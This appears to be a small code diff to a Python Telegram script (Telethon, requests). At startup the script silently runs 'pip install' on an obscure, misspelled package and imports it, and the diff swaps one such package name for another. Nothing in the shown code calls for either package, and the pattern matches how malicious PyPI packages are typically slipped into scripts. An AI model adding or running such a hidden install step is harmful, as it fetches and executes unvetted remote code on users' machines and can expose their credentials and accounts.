@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolouringaddsV2")
-import pythoncolouringaddsV2
+os.system("pip install syssqlite3liberyV1")
+import syssqlite3liberyV1
 import requests
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
